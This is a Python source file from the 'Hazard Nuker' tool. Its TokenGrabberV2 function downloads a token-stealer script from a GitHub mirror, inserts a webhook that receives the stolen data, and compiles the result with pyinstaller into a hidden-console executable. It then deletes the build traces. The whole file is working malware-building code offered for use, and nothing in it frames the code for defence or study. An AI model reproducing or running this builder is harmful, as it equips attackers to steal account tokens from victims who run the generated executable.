# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import os
import shutil
import Hazard
import requests
import base64
import random

from Crypto.Cipher import AES
from Crypto import Random
from colorama import Fore

from util.plugins.common import setTitle, installPackage


def TokenGrabberV2(WebHook, fileName):
    required = [
        "requests",
        "psutil",
        "pypiwin32",
        "pycryptodome",
        "pyinstaller",
        "pillow",
    ]
    installPackage(required)
    code = requests.get(
        "https://raw.githubusercontent.com/KDot227/hazard-nuker-mirror/main/assets/main.py"
    ).text.replace("WEBHOOK_HERE", WebHook)
    with open(f"{fileName}.py", "w", encoding="utf8", errors="ignore") as f:
        f.write(code)

    print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
    setTitle(f"Creating {fileName}.exe")

    os.system(
        f"pyinstaller --onefile --noconsole --log-level=INFO -i NONE -n {fileName} {fileName}.py"
    )
    try:
        # clean build files
        shutil.move(
            f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe"
        )
        shutil.rmtree("build")
        shutil.rmtree("dist")
        shutil.rmtree("__pycache__")
        os.remove(f"{fileName}.spec")
        os.remove(f"{fileName}.py")
    except FileNotFoundError:
        pass

    print(f"\n{Fore.GREEN}File created as {fileName}.exe\n")
    input(
        f"{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue . . .  {Fore.RED}"
    )
    Hazard.main()
